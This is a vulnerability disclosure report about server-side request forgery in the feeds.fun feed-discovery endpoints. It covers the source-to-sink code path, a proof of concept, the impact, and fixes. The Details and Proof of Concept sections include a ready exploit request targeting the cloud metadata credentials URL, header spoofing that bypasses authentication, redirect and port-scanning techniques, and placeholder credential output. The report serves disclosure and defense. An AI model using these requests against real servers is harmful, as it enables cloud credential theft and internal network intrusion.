# VDR-017: Server-Side Request Forgery in Tiendil/feeds.fun

- **Target**: [Tiendil/feeds.fun](https://github.com/Tiendil/feeds.fun)
- **Severity**: High (CVSS 3.1: 7.7)
- **CWE**: [CWE-918](https://cwe.mitre.org/data/definitions/918.html) - Server-Side Request Forgery
- **CVE**: [CVE-2026-51094](https://www.cve.org/CVERecord?id=CVE-2026-51094)
- **CVSS Vector**: AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N
- **Discovered**: 2026-06-05
- **Researcher**: Dennis Sepede - [Securitix Solutions](https://securitixsolutions.com)

## Summary

The feed-discovery feature of feeds.fun fetches an arbitrary, caller-supplied
URL server-side with no SSRF protection. The endpoints
`POST /spa/api/private/discover-feeds` and `POST /spa/api/private/add-feed` pass
the user's `url` to `feeds_discoverer.discover()`, which loads the URL via
`httpx` with `follow_redirects=True`. The only validation applied to the URL is
a scheme check (`http`/`https`); there is no allowlist and no rejection of
private, loopback, link-local or cloud-metadata addresses anywhere in the code.
An authenticated user (or, in a proxy-less self-hosting misconfiguration, an
unauthenticated attacker) can therefore coerce the server into issuing requests
to internal-only services and to cloud metadata endpoints (e.g.
`http://169.254.169.254/`), enabling theft of IAM credentials and reconnaissance
of the internal network. Confirmed on release-1.28.0 (commit `b702146`).

## Affected Component

- `ffun/ffun/loader/operations.py:45` - httpx GET of a user-controlled URL with `follow_redirects=True`
- `ffun/ffun/domain/urls.py:107` - validation (`schema_supported`) restricts only the scheme, no private/loopback/link-local block
- `ffun/ffun/domain/http.py:25-42` - httpx client factory with no IP/host allowlist
- `ffun/ffun/api/spa/http_handlers.py:491` (`api_discover_feeds`) and `:537` (`api_add_feed`) - the source endpoints
- `ffun/ffun/auth/dependencies.py:11-44` - header-based authentication (`X-FFun-User-Id`)

**Affected version**: release-1.28.0, commit `b70214690f524077728266cf3870578a4eab5d8d` (2026-05-30). Earlier versions sharing this code path are expected to be affected.

## Details

### Source -> sink

1. A request hits `POST /spa/api/private/discover-feeds`
   (`http_handlers.py:490-492`). The body is `{"url": "<attacker-controlled>"}`,
   typed `DiscoverFeedsRequest.url: UnknownUrl` - and `UnknownUrl` is a bare
   `NewType` over `str` (`domain/entities.py:23`), so no Pydantic-level URL
   validation is applied. The handler calls:

   ```python
   # ffun/ffun/api/spa/http_handlers.py:491
   async def api_discover_feeds(request: entities.DiscoverFeedsRequest, user: User) -> entities.DiscoverFeedsResponse:
       result = await fd_domain.discover(url=request.url, depth=1)
   ```

   `POST /spa/api/private/add-feed` (`:537`) is identical with `depth=0`.

2. `feeds_discoverer.domain.discover()` runs the URL through
   `_discover_adjust_url` -> `normalize_classic_unknown_url()`
   (`domain/urls.py:142`). The ONLY restriction there is the scheme check:

   ```python
   # ffun/ffun/domain/urls.py:107
   def schema_supported(scheme: str | None) -> bool:
       if scheme in (None, "http", "https"):
           return True
       ...
       return False
   ```

   There is no resolution of the host and no comparison against private,
   loopback, link-local or metadata ranges - anywhere in `urls.py`.

3. `_discover_load_url` (`feeds_discoverer/domain.py:70`) calls
   `loader.domain.load_decoded_content()` -> `load_content_with_proxies()` ->
   `loader.operations.load_content()`, which performs the request at the sink:

   ```python
   # ffun/ffun/loader/operations.py:43-45
   async with semaphore:
       async with http.client(proxy=proxy.url, headers=headers) as client:
           response = await client.get(url, follow_redirects=True)
   ```

   The client factory (`domain/http.py:25-42`) constructs a plain
   `httpx.AsyncClient` with only `User-Agent`/`Accept-Encoding` headers and an
   optional proxy - no IP/host validation, no egress filtering.

### follow_redirects amplification

`load_content_with_proxies()` iterates protocols `("https", "http")`
(`loader/domain.py:83-86`), so even an `https`-only-looking target is also
retried over **plaintext HTTP**. Combined with `follow_redirects=True`, an
attacker-controlled URL on a public host can `302`-redirect the server to an
internal address; the redirect target is fetched with no re-validation
(httpx follows up to its default of 20 hops). Both behaviours are demonstrated
in the PoC.

### Observability (oracle + reflection)

`api_discover_feeds` maps the discovery outcome to distinct messages
(`http_handlers.py:497-513`): `incorrect_url`, `cannot_access_url`, `not_html`,
`no_feeds_found`, or a populated `feeds` list on success. This is a usable
error oracle for blind SSRF - e.g. internal port scanning distinguishes
"connection refused/timeout" (`cannot_access_url`) from "got a non-feed
response" (`not_html` / `no_feeds_found`). When the fetched internal resource
*is* parseable as a feed, its content is reflected back in the
`DiscoverFeedsResponse.feeds` / `AddFeedResponse` payload, turning the bug from
semi-blind into a content-returning SSRF.

### Authentication model and the unauthenticated edge

Both endpoints depend on `User` (`auth/dependencies.py:52-54`). That dependency
(`_idp_user`, `:11`) derives the caller identity from request **headers**:

```python
# ffun/ffun/auth/dependencies.py:20
external_user_id = request.headers.get(settings.header_user_id)   # default: "X-FFun-User-Id"
```

The design assumes an upstream authentication proxy injects these headers. Two
consequences:

- **Authenticated case (baseline)**: any registered user can trigger the SSRF.
  Privileges required = low (`PR:L`).
- **Unauthenticated misconfiguration**: if the FastAPI backend is exposed
  without the auth proxy in front (a realistic self-hosting mistake), the
  attacker simply sets `X-FFun-User-Id` and `X-FFun-Identity-Provider-Id`
  themselves and is fully unauthenticated (`PR:N`), raising the CVSS base score
  to 8.6 (vector `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`).

## Proof of Concept

A runnable PoC is provided in `poc/`. It imports and calls the **genuine,
unmodified** feeds.fun release-1.28.0 modules - `ffun.domain.urls`,
`ffun.domain.http.client`, `ffun.loader.operations.load_content`, and
`ffun.feeds_discoverer.domain.discover` (the exact function the `/discover-feeds`
endpoint calls). Nothing in the validation/request/fetch path is copied or
re-implemented; the only stub is the unrelated `lr_proxy_states` DB read, which
is replaced by the exact default the production code returns for an empty table.
An internal-only HTTP listener on loopback (port 18807) stands in for an
internal service / the `169.254.169.254` metadata endpoint and logs every
request it receives. Its log is the authoritative proof of a server-side fetch.

### Request (live-server form)

Against a running backend, the SSRF is triggered with:

```http
POST /spa/api/private/discover-feeds HTTP/1.1
Host: target
Content-Type: application/json
X-FFun-User-Id: attacker
X-FFun-Identity-Provider-Id: single_user

{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

(`X-FFun-*` headers are attacker-supplied only in the proxy-less unauth case; an
authenticated user already has them injected by the auth proxy.)

### Validation accepts internal targets (real `urls.py` output)

The genuine `normalize_classic_unknown_url()` accepts every internal/metadata
target (full transcript in `poc/OUTPUT.txt`):

```
  [ACCEPTED (no SSRF block)] http://127.0.0.1:18807/secret
        normalize_classic_unknown_url -> 'http://127.0.0.1:18807/secret'
  [ACCEPTED (no SSRF block)] http://169.254.169.254/latest/meta-data/iam/security-credentials/
        normalize_classic_unknown_url -> 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
  [ACCEPTED (no SSRF block)] http://10.0.0.5/internal
        normalize_classic_unknown_url -> 'http://10.0.0.5/internal'
  [ACCEPTED (no SSRF block)] http://192.168.1.1/
  [ACCEPTED (no SSRF block)] http://[::1]:80/
  [ACCEPTED (no SSRF block)] http://metadata.google.internal/computeMetadata/v1/
```

### Real internal-listener hit (authoritative proof)

The internal listener logged the server-side requests made by the genuine sink,
by the genuine `discover()` path, and via `follow_redirects=True`:

```
[2026-06-05T10:56:19.140222] INTERNAL-LISTENER HIT  src=127.0.0.1  GET /secret-from-sink       UA='unknown'
[2026-06-05T10:56:19.932175] INTERNAL-LISTENER HIT  src=127.0.0.1  GET /secret-via-discover    UA='unknown'
[2026-06-05T10:56:21.267273] INTERNAL-LISTENER HIT  src=127.0.0.1  GET /redirect-to-internal   UA='unknown'
[2026-06-05T10:56:21.375921] INTERNAL-LISTENER HIT  src=127.0.0.1  GET /secret-after-redirect  UA='unknown'
```

The sink fetch returned the stand-in metadata body to the server-side caller
(demonstrating exfiltration of sensitive internal content):

```
  HTTP status from internal service: 200
  Body returned to the server-side fetcher (sensitive data exfiltrated):
    | { "Code" : "Success", "Type" : "AWS-HMAC",
    |   "AccessKeyId" : "ASIAEXAMPLEINTERNAL0",
    |   "SecretAccessKey" : "wJalrEXAMPLEKEYwJalrXUtnFEMIK7MDENGbPxRfiCY",
    |   "Token" : "FQoGZXIvYXdzEXAMPLE-INTERNAL-METADATA-SSRF-PROOF", ... }
```

The `/redirect-to-internal` -> `/secret-after-redirect` pair proves that
`follow_redirects=True` follows a `302` into an internal target with no
re-validation. (Values such as `ASIA...`/`wJalr...` are non-functional
placeholders served by the test listener, not real credentials.)

## Impact

An attacker who can reach the discovery endpoints can make the server issue
HTTP requests to destinations the attacker cannot reach directly:

- **Cloud metadata / credential theft**: fetch `http://169.254.169.254/...`
  (AWS IMDSv1), `http://metadata.google.internal/...` (GCP), etc., to read IAM
  role credentials and instance metadata, which are then reflected back when the
  response parses as a feed.
- **Internal-service access**: reach internal-only HTTP services (admin panels,
  databases with HTTP interfaces, dashboards, other microservices) on
  loopback / RFC1918 / link-local addresses.
- **Internal port / host scanning**: use the discovery status oracle
  (`cannot_access_url` vs `not_html`/`no_feeds_found`) to map reachable internal
  hosts and open ports.
- **Redirect-based filter bypass**: a benign-looking public URL can redirect the
  server into the internal network, and the `https`->`http` protocol fallback
  broadens reachability to plaintext-only internal services.

## Recommendation

- **Allowlist schemes and validate the resolved IP**: after normalization,
  resolve the host and reject any request whose resolved address is private
  (RFC1918), loopback (127.0.0.0/8, ::1), link-local (169.254.0.0/16, fe80::/10),
  unique-local (fc00::/7), or otherwise non-public (including the cloud metadata
  IP `169.254.169.254` and `metadata.google.internal`). Block before connecting.
- **Re-validate on every redirect hop**: do not blindly follow redirects.
  Disable `follow_redirects` for the discovery/add-feed fetch, or follow
  manually and re-run the IP allowlist check against each hop's target to
  prevent DNS-rebinding / redirect-based bypasses. Pin the resolved IP for the
  actual connection (resolve-then-connect) to close the TOCTOU/rebinding gap.
- **Constrain ports** to 80/443 for discovery, and apply network-level egress
  filtering so the loader cannot reach metadata/internal ranges even if
  application checks are bypassed.
- **Harden the auth assumption**: fail closed if the expected upstream-proxy
  authentication headers are absent, and document that the FastAPI backend must
  never be exposed directly without the auth proxy.

## Status

| Date | Event |
|------|-------|
| 2026-06-05 | Vulnerability discovered during source code audit |
| 2026-06-05 | Working PoC confirmed |
| TBD | CVE request submitted to MITRE CNA-LR |

## References

- [CWE-918](https://cwe.mitre.org/data/definitions/918.html)
- [Upstream repository](https://github.com/Tiendil/feeds.fun)
